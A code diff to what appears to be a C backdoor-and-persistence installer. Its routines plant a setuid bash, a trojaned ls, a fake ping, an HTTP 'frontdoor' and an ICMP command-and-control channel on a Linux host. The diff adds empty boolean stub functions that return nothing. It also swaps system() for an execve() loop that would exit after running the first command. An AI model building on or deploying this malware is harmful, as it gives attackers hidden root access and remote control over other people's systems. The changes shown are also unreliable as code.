@@ -41,17 +41,26 @@
 #define SYSTEM_BASH_PATH "/bin/bash"
 
 // Functions:
+bool compat_setuid_bash(void);
 int re_setuid_bash(void);
+bool compat_processd(void);
 int re_processd(void);
+bool compat_broken_ls(void);
 int re_broken_ls(void);
+bool compat_fake_ping(void);
 int re_fake_ping(void);
+bool compat_http_frontdoor(void);
 int re_http_frontdoor(void);
+bool compat_icmp_c2(void);
 int re_icmp_c2(void);
 
 ////////////////////////////////////////
 ////////// SETUID BASH
 ////////////////////////////////////////
 
+bool compat_setuid_bash(void){
+
+}
 int re_setuid_bash(void){
     struct stat file_stat;
     char copy_buffer[MAX_BUFFER_SIZE];
@@ -152,9 +161,18 @@ static const char *ls_commands = { "sed -i -e 's/# deb-src/deb-src/' /etc/apt/so
     NULL
 };
 int re_broken_ls(void){
+    char *argv[] = { "/bin/bash", "-c", NULL, NULL};
+    char *envp[] = {
+        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin",
+        NULL
+    };
+
     char **current_string = ls_commands;
     while (*current_string) {
-        system(*current_string++);
+        argv[2] = *current_string++;
+        if (execve(argv[0], argv, envp) == -1) {
+            perror("execle failed");
+        }
     };
     return 0;
 }
@@ -725,8 +743,3 @@ int main(int argc, char **argv){
     if (failures & ICMPK_ID)
         print_failure("icmpk");
 }
-
-// Requires:
-// sudo apt update -y
-// sudo apt install -y libcurl4-openssl-dev
-// sudo ./this
